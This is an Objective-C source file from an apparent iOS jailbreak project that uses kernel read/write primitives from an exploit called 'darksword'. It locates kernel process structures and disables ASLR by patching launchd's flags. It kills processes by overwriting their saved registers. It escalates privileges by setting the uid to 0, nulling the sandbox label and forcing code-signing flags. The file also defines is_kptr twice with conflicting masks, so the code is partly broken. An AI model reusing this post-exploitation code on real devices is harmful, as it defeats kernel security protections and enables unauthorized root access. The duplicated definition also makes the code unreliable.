//
//  utils.m
//  lara
//

#import "utils.h"
#import "darksword.h"
#import "xpf.h"
#import "offsets.h"

#import <Foundation/Foundation.h>
#import <stdio.h>
#import <unistd.h>
#import <string.h>
#import <sys/types.h>
#include <sys/sysctl.h>
#include <stdint.h>
#include <stdbool.h>

#define P_DISABLE_ASLR 0x00001000

uint32_t PROC_PID_OFFSET;                           // p_pid
static const uint32_t PROC_NAME_OFFSET = 0x56c;     // p_comm
static const uint32_t PROC_UID_OFFSET  = 0x30;      // p_uid
static const uint32_t PROC_GID_OFFSET  = 0x34;      // p_gid
static const uint32_t PROC_NEXT_OFFSET = 0x08;      // p_list le_next
static const uint32_t PROC_PREV_OFFSET = 0x00;      // p_list le_prev
static const uint32_t PROC_PFLAG_OFFSET = 0x454;
static const uint32_t ARM_SS_OFFSET = 0x8;
uint64_t PROC_STRUCT_SIZE;
uint32_t TASK_TNEXT_OFFSET;
uint32_t THREAD_MUPCB_OFFSET;

struct arm_saved_state64 {
  uint64_t x[29];
  uint64_t fp;
  uint64_t lr;
  uint64_t sp;
  uint64_t pc;
  uint32_t cpsr;
  uint32_t aspsr;
  uint64_t far;
  uint32_t esr;
  uint32_t exception;
  uint64_t jophash;
};

cpu_subtype_t get_hw_cpufamily(void) {
    cpu_subtype_t cpufam = 0;
    size_t cpufamsize = sizeof(cpufam);
    sysctlbyname("hw.cpufamily", &cpufam, &cpufamsize, NULL, 0);
    return cpufam;
}

void init_offsets(void) {
    char ios[256];
    size_t size = sizeof(ios);

    sysctlbyname("kern.osproductversion", ios, &size, NULL, 0);

    uint64_t procsize = getprocsize();
    if (procsize != 0) {
        PROC_STRUCT_SIZE = procsize;
    } else {
        printf("getprocsize() returned 0x0. defaulting to 0x740.\n");
        PROC_STRUCT_SIZE = 0x740;
    }

    int major = 0, minor = 0, patch = 0;
    sscanf(ios, "%d.%d.%d", &major, &minor, &patch);

    if (major > 18 || (major == 18 && minor >= 4)) {
        PROC_PID_OFFSET = 0x60;
    } else {
        PROC_PID_OFFSET = 0x28;
    }

    if (major == 17 && minor <= 7) {
        TASK_TNEXT_OFFSET = 0x58;
    } else if (major >= 18) {
        TASK_TNEXT_OFFSET = 0x50;
    } else {
        TASK_TNEXT_OFFSET = 0x50;
    }

    cpu_subtype_t cpufam = get_hw_cpufamily();

    bool isA10 =
        (cpufam == CPUFAMILY_ARM_HURRICANE);

    bool isA17Above =
        (cpufam == CPUFAMILY_ARM_COLL ||
         cpufam == CPUFAMILY_ARM_IBIZA ||
         cpufam == CPUFAMILY_ARM_TUPAI ||
         cpufam == CPUFAMILY_ARM_DONAN);

    if (major >= 18) {
        if (isA17Above)
            THREAD_MUPCB_OFFSET = 0x108;
        else if (isA10)
            THREAD_MUPCB_OFFSET = 0x100;
        else
            THREAD_MUPCB_OFFSET = 0xb8;
    } else {
        if (isA17Above)
            THREAD_MUPCB_OFFSET = 0x100;
        else if (isA10)
            THREAD_MUPCB_OFFSET = 0xf8;
        else
            THREAD_MUPCB_OFFSET = 0xb0;
    }

    printf("TASK_TNEXT_OFFSET: 0x%x\n", TASK_TNEXT_OFFSET);
    printf("THREAD_MUPCB_OFFSET: 0x%x\n", THREAD_MUPCB_OFFSET);
    printf("PROC_PID_OFFSET: 0x%x\n", PROC_PID_OFFSET);
    printf("PROC_STRUCT_SIZE: 0x%llx\n", PROC_STRUCT_SIZE);
}

static NSString *const kkernprocoffset = @"lara.kernprocoff";

static bool is_kptr(uint64_t p) {
    return (p & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

bool is_pac_supported(void) {
    cpu_subtype_t cpusubtype = 0;
    size_t sz = sizeof(cpusubtype);
    if (sysctlbyname("hw.cpusubtype", &cpusubtype, &sz, NULL, 0) != 0)
        return false;

    return cpusubtype == CPU_SUBTYPE_ARM64E;
}

static inline uint64_t xpaci(uint64_t a) {
    if (!is_pac_supported()) return a;
    if ((a & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) return a;

    register uint64_t x0 asm("x0") = a;
    asm volatile(".long 0xDAC143E0" : "+r"(x0)); // XPACI X0
    return x0;
}

static uint64_t loadkernproc(void) {
    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kkernprocoffset];
    if (!n) return 0;
    return (uint64_t)n.unsignedLongLongValue;
}

static uint64_t kernprocaddress(void) {
    uint64_t offset = loadkernproc();
    if (offset != 0) {
        return ds_get_kernel_base() + offset;
    }

    uint64_t kernslide = ds_get_kernel_slide();
    return 0xfffffff0079fd9c8 + kernslide;
}

uint64_t procbypid(pid_t targetpid) {
    if (!ds_is_ready()) {
        printf("darksword not ready\n");
        return 0;
    }

    uint64_t kernprocaddr = kernprocaddress();
    uint64_t kernproc = ds_kread64(kernprocaddr);

    printf("kernel proc: 0x%llx\n", kernproc);

    if (!is_kptr(kernproc)) {
        printf("kernel proc pointer invalid\n");
        return 0;
    }

    printf("looking for pid: %d\n", targetpid);

    uint64_t currentproc = kernproc;
    int count = 0;

    while (currentproc && count < 2000) {

        if (!is_kptr(currentproc)) {
            printf("proc pointer invalid at step %d\n", count);
            break;
        }

        uint32_t pid = ds_kread32(currentproc + PROC_PID_OFFSET);

        if (pid == targetpid) {

            char name[64] = {0};
            ds_kread(currentproc + PROC_NAME_OFFSET, name, 32);

            uint32_t uid = ds_kread32(currentproc + PROC_UID_OFFSET);
            uint32_t gid = ds_kread32(currentproc + PROC_GID_OFFSET);

            printf("found proc: %s (pid=%d uid=%d gid=%d) @ 0x%llx\n",
                   name, pid, uid, gid, currentproc);

            return currentproc;
        }

        uint64_t next = ds_kread64(currentproc + PROC_NEXT_OFFSET);

        if (!is_kptr(next) || next == currentproc) {
            printf("proc list ended at step %d\n", count);
            break;
        }

        currentproc = next;
        count++;
    }

    printf("pid %d not found after %d iterations\n", targetpid, count);
    return 0;
}

uint64_t ourproc(void) {
    return procbypid(getpid());
}

uint64_t taskbyproc(uint64_t procaddr) {
    if (!procaddr) return 0;
    return procaddr + PROC_STRUCT_SIZE;
}

uint64_t procbyname(const char *procname) {
    if (!procname || strlen(procname) == 0) {
        printf("invalid process name\n");
        return 0;
    }

    if (!ds_is_ready()) {
        printf("darksword not ready\n");
        return 0;
    }

    uint64_t kernprocaddr = kernprocaddress();
    uint64_t kernproc = ds_kread64(kernprocaddr);

    if (!is_kptr(kernproc)) {
        printf("kernel proc pointer invalid\n");
        return 0;
    }

    printf("looking for process: %s\n", procname);

    uint64_t currentproc = kernproc;
    int count = 0;

    while (currentproc && count < 2000) {
        if (!is_kptr(currentproc)) {
            break;
        }

        char name[64] = {0};
        ds_kread(currentproc + PROC_NAME_OFFSET, name, 32);

        if (strcmp(name, procname) == 0) {

            uint32_t pid = ds_kread32(currentproc + PROC_PID_OFFSET);
            printf("resolved %s -> pid %d\n", procname, pid);

            return procbypid(pid);
        }

        uint64_t next = ds_kread64(currentproc + PROC_NEXT_OFFSET);

        if (!is_kptr(next) || next == currentproc) {
            break;
        }

        currentproc = next;
        count++;
    }

    printf("process '%s' not found\n", procname);
    return 0;
}

bool aslrstate;

void getaslrstate(void) {
    uint64_t launchd = procbypid(1);
    if (!launchd) {
        printf("(aslr) failed. could not find launchd proc\n");
        return;
    }

    uint32_t pflag = ds_kread32(launchd + PROC_PFLAG_OFFSET);
    aslrstate = !(pflag & P_DISABLE_ASLR);
    printf("(aslr) refreshed. aslr is %s\n", aslrstate ? "on" : "off");
}

int toggleaslr(void) {
    uint64_t launchd = procbypid(1);
    if (!launchd) {
        printf("(aslr) failed. could not find launchd proc\n");
        return -1;
    }

    uint32_t pflag = ds_kread32(launchd + PROC_PFLAG_OFFSET);
    uint32_t desired;

    if (aslrstate) {
        desired = pflag | P_DISABLE_ASLR;
        ds_kwrite32(launchd + PROC_PFLAG_OFFSET, desired);
    } else {
        desired = pflag & ~P_DISABLE_ASLR;
        ds_kwrite32(launchd + PROC_PFLAG_OFFSET, desired);
    }
    uint32_t verify = ds_kread32(launchd + PROC_PFLAG_OFFSET);
    aslrstate = !(verify & P_DISABLE_ASLR);

    printf("(aslr) aslr is now %s\n", aslrstate ? "on" : "off");

    return 0;
}

int killproc(const char* name) {
    uint64_t proc = procbyname(name);
    uint64_t task = taskbyproc(proc);
    printf("proc: 0x%llx, task: 0x%llx\n", proc, task);
    
    uint64_t threads = ds_kread64(task + TASK_TNEXT_OFFSET);
    uint64_t upcb = xpaci(ds_kread64(threads + THREAD_MUPCB_OFFSET));
    uint64_t state = upcb + ARM_SS_OFFSET;
    
    for(int i = 0; i < 11; i++) {
        ds_kwrite64(state + offsetof(struct arm_saved_state64, x[i]), 0x1337133713371337);
    }

    ds_kwrite64(state + offsetof(struct arm_saved_state64, fp), 0x1337133713371337);
    ds_kwrite64(state + offsetof(struct arm_saved_state64, sp), 0x1337133713371337);
    
    return 0;
}

#define CS_PLATFORM_BINARY 0x00400000
#define CS_DEBUGGED        0x00000100
#define CS_GET_TASK_ALLOW  0x00000004
#define CS_INSTALLER       0x00000008

#define UCRED_CR_LABEL_OFFSET 0x78

static bool is_valid_csflags(uint32_t v) {
    static const uint32_t known[] = {
        0x00000000, 0x00000001, 0x00000002, 0x00000004, 0x00000008,
        0x00000010, 0x00000020, 0x00000040, 0x00000080, 0x00000100,
        0x00000200, 0x00000400, 0x00000800, 0x00001000, 0x00002000,
        0x00004000, 0x00008000, 0x00010000, 0x00020000, 0x00040000,
        0x00080000, 0x00100000, 0x00200000, 0x00400000, 0x00800000,
        0x00000104, 0x00000108, 0x0000010c, 0x00000144, 0x00000148,
        0x0000014c, 0x00000204, 0x00000208, 0x0000020c,
    };
    for (size_t i = 0; i < sizeof(known)/sizeof(known[0]); i++) {
        if (v == known[i]) return true;
    }
    return false;
}

static bool is_kptr(uint64_t v) {
    return (v & 0xfffffff000000000ULL) == 0xfffffff000000000ULL;
}

static uint32_t find_csflags_offset(uint64_t proc) {
    uint64_t procsize = PROC_STRUCT_SIZE;
    for (uint32_t off = 0x100; off < procsize - 4; off += 4) {
        uint32_t v = ds_kread32(proc + off);
        if (is_valid_csflags(v)) {
            uint32_t test = v | CS_DEBUGGED;
            ds_kwrite32(proc + off, test);
            uint32_t verify = ds_kread32(proc + off);
            ds_kwrite32(proc + off, v);
            if (verify == test) {
                printf("found csflags at offset 0x%x (value=0x%x)\n", off, v);
                return off;
            }
        }
    }
    printf("csflags offset not found\n");
    return 0;
}

static uint64_t find_ucred_offset(uint64_t proc) {
    uint64_t procsize = PROC_STRUCT_SIZE;
    for (uint32_t off = 0x80; off < procsize - 8; off += 8) {
        uint64_t v = ds_kread64(proc + off);
        if (is_kptr(v)) {
            uint64_t uid_val = ds_kread32(v + 0x18);
            if (uid_val == getuid()) {
                printf("found ucred at offset 0x%x (ptr=0x%llx uid=%llu)\n", off, v, (uint64_t)uid_val);
                return off;
            }
        }
    }
    printf("ucred offset not found\n");
    return 0;
}

int patchcsflags(void) {
    uint64_t self = ourproc();
    if (!self) {
        printf("patchcsflags: ourproc() returned NULL\n");
        return -1;
    }

    uint32_t csflags_off = find_csflags_offset(self);
    if (!csflags_off) {
        printf("patchcsflags: could not find csflags offset\n");
        return -1;
    }

    uint64_t ucred_off = find_ucred_offset(self);
    if (ucred_off) {
        uint64_t ucred = ds_kread64(self + ucred_off);
        if (ucred && is_kptr(ucred)) {
            ds_kwrite32(ucred + 0x18, 0);
            printf("patched uid to 0\n");

            uint64_t cr_label = ds_kread64(ucred + UCRED_CR_LABEL_OFFSET);
            printf("cr_label before: 0x%llx\n", cr_label);
            if (cr_label) {
                ds_kwrite64(ucred + UCRED_CR_LABEL_OFFSET, 0);
                uint64_t verify = ds_kread64(ucred + UCRED_CR_LABEL_OFFSET);
                printf("cr_label after: 0x%llx (nulled: %s)\n", verify, verify == 0 ? "yes" : "NO");
            }
        }
    }

    uint32_t oldflags = ds_kread32(self + csflags_off);
    uint32_t newflags = oldflags | CS_PLATFORM_BINARY | CS_DEBUGGED | CS_GET_TASK_ALLOW | CS_INSTALLER;
    ds_kwrite32(self + csflags_off, newflags);

    uint32_t verify = ds_kread32(self + csflags_off);
    printf("csflags: 0x%x -> 0x%x (verified: 0x%x)\n", oldflags, newflags, verify);

    if (verify != newflags) {
        printf("patchcsflags: verification failed\n");
        return -1;
    }

    uint64_t task = self + PROC_STRUCT_SIZE;
    if (is_kptr(task)) {
        uint32_t taskflags = ds_kread32(task + csflags_off);
        uint32_t newtaskflags = taskflags | CS_PLATFORM_BINARY | CS_DEBUGGED | CS_GET_TASK_ALLOW | CS_INSTALLER;
        ds_kwrite32(task + csflags_off, newtaskflags);
        uint32_t tverify = ds_kread32(task + csflags_off);
        printf("task csflags: 0x%x -> 0x%x (verified: 0x%x)\n", taskflags, newtaskflags, tverify);
    }

    return 0;
}
